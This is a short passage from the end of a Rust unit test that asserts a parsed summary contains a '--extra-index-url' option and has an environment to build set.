            .any(|s| s.contains("--extra-index-url")));
        assert!(summary.environment_to_build.is_some());
    }
}
